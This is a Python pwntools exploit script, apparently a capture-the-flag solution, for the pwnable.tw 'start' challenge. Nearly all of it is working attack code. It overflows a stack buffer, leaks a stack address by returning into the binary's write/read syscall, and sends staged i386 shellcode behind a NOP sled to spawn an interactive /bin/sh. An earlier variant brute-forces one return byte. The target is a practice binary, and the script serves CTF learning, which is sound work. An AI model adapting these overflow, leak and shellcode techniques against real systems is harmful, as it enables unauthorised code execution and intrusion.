#!/usr/bin/env python3

from pwn import *

exe = ELF("./start")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10000)

    return r

# what i came up with initially which is overwrite last byte of stack with 4 bits brute with 1/16 probability, then for bigger shellcode do a stage 2
def main():
    r = conn()

    # gdb.attach(r)

    rop = ROP(exe)
    
    shellcode = asm(shellcraft.i386.syscall("SYS_read", None, None, 100))

    rop.raw(shellcode)
    rop.raw(b'A' * (20 - len(shellcode)))
    rop.raw(rop.find_gadget(['ret'])[0])
    rop.raw(b'\x84') # 1/16 probability

    r.sendafter(b'CTF:', rop.chain())

    sleep(0.5)

    stage2 = b'\x90' * 40 + asm(shellcraft.i386.linux.sh())

    r.send(stage2)

    r.interactive()

# found through writeups that you can just jump back to write read part again and it gives a stack leak, then if you want do a stage 2 or find a better shellcode, i can't bother
def main2():
    r = conn()

    # gdb.attach(r)

    rop = ROP(exe)

    rop.raw(b'A' * 20)
    rop.raw(0x08048087) # write and read syscall

    r.sendafter(b'CTF:', rop.chain())

    output = r.recv(20)

    stack_leak = u32(output[:4])

    rop = ROP(exe, base=stack_leak-0x4)
    rop.raw(b'A' * 20)
    rop.raw(stack_leak + 20)
    rop.raw(asm(shellcraft.i386.syscall("SYS_read", None, None, 100)))

    print(rop.dump())

    r.send(rop.chain())

    sleep(0.5)

    stage2 = b'\x90' * 40 + asm(shellcraft.i386.linux.sh())

    r.send(stage2)
    
    r.interactive()

if __name__ == "__main__":
    main2()
